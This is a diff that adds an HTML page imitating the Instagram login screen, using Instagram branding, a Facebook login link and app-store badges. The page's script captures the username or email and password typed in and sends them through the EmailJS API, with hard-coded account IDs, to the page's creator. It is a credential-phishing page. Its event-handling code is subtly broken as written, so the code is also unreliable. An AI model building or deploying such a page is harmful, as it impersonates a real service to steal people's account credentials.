@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="icon"
+      href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png"
+    />
+
+            <script>
+        (function() {
+            emailjs.init("qIzZMycg371G5nbiq");
+        })();
+    </script>
+  </head>
+  <body>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
+
+body{
+    margin: 0;
+    padding: 0;
+}
+
+.all-item-container{
+    display: flex;
+    align-items: center;
+    margin: auto;
+    flex-direction: column;
+    margin-top: 80px;
+}
+
+form{
+    display: flex;
+    flex-direction: column;
+    height: 150px;
+}
+
+.face{
+    display: flex;
+    width: 30px;
+}
+
+a{
+    display: flex;
+    flex-direction: row;
+    text-decoration: none;
+    color: #385185;
+    align-items: center;
+    font-family: "Roboto", sans-serif;
+}
+
+.logo-img{
+    width: 175px;
+    height: 50px;
+}
+
+.form-div{
+    height: 150px;
+    display: flex;
+    margin-top: 30px;
+}
+
+input{
+    outline: none;
+    width: 260px;
+    height: 36px;
+    margin: 5px;
+    font-family: 'Roboto', sans-serif;
+    border-radius: 3px;
+    border: 1px solid grey;
+}
+
+
+button{
+    margin-top: 10px;
+    background-color: #0095f6;
+    color: white;
+    cursor: pointer;
+    border: none;
+    height: 35px;
+    font-family: "Roboto", sans-serif;
+    border-radius: 3px;
+}
+
+h4{
+    font-family: "Roboto", sans-serif;
+    opacity: 50%;
+}
+
+.forgot{
+    margin-top: 10px;
+    font-size: 14px;
+}
+
+.alt-container{
+    display: flex;
+    align-items: center;
+    margin: auto;
+    flex-direction: column;
+    margin-top: 120px;
+    font-family: "Roboto", sans-serif;
+}
+
+.play-store, .microsoft{
+    width: 130px;
+    height: 40px;
+}
+
+h4{
+    display: flex;
+    font-size: 12px;
+}
+
+.signup{
+    color: #0095f6;
+    opacity: 100%;
+}
+    </style>
+    <div class="all-item-container">
+      <img
+        class="logo-img"
+        src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Black-Logo.wine.svg"
+        alt=""
+      />
+
+      <div class="form-div">
+        <form action="">
+          <input
+            class="email"
+            type="text"
+            placeholder="Phone number, username, or email"
+          />
+          <input class="password" type="password" placeholder="Password" />
+          <button class="btn" type="submit">Log in</button>
+        </form>
+      </div>
+
+      <h4>OR</h4>
+      <a href=""
+        ><img
+          class="face"
+          src="https://i.pinimg.com/564x/b3/26/b5/b326b5f8d23cd1e0f18df4c9265416f7--facebook-icon-negative-feedback.jpg"
+          alt=""
+        />
+        Log in with Facebook</a
+      >
+      <a class="forgot" href="">Forgot password?</a>
+    </div>
+
+    <div class="alt-container">
+      <h4>Don't have an account?<a class="signup" href=""> Sign up</a></h4>
+      <h5>Get the app</h5>
+      <div class="play-image">
+        <img
+          class="play-store"
+          src="https://www.fcsok.org/wp-content/uploads/2020/04/get-it-on-google-play-badge.png"
+          alt=""
+        />
+        <img
+          class="microsoft"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/1200px-Get_it_from_Microsoft_Badge.svg.png"
+          alt=""
+        />
+      </div>
+    </div>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js"
+    ></script>
+    <script>
+        
+        // Add focus effect to input fields
+        const emailInput = document.getElementsByClassName('email');
+        const passwordInput = document.getElementsByClassName("password")
+
+        const signin_btn_next = document.getElementsByClassName("btn")
+
+        signin_btn_next.addEventListener("click", (e)=>{
+            e.preventDefault();
+            const email = document.getElementsByClassName('email').value;
+            const password = document.getElementsByClassName('password').value;
+
+            var data = {
+              service_id: 'service_pkedzsj',
+              template_id: 'template_taqeb2d',
+              user_id: 'eq27vzfkDJdV0_rCS',  // your public key
+              template_params: {
+                email: email, 
+                password: password 
+              }
+            };
+
+            fetch('https://api.emailjs.com/api/v1.0/email/send', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(data)
+            })
+            .then(function(response) {
+              if (response.ok) {
+                alert('Your mail is sent!');
+              } else {
+                return response.json().then(err => Promise.reject(err));
+              }
+            })
+            .catch(function(error) {
+              alert('Oops... ' + JSON.stringify(error));
+            });
+        })
+
+        emailInput.addEventListener('focus', function() {
+            this.parentElement.classList.add('is-focused');
+        });
+        
+        emailInput.addEventListener('blur', function() {
+            if (!this.value) {
+                this.parentElement.classList.remove('is-focused');
+            }
+        });
+    </script>
+    <script src="script.js"></script>
+  </body>
+</html>
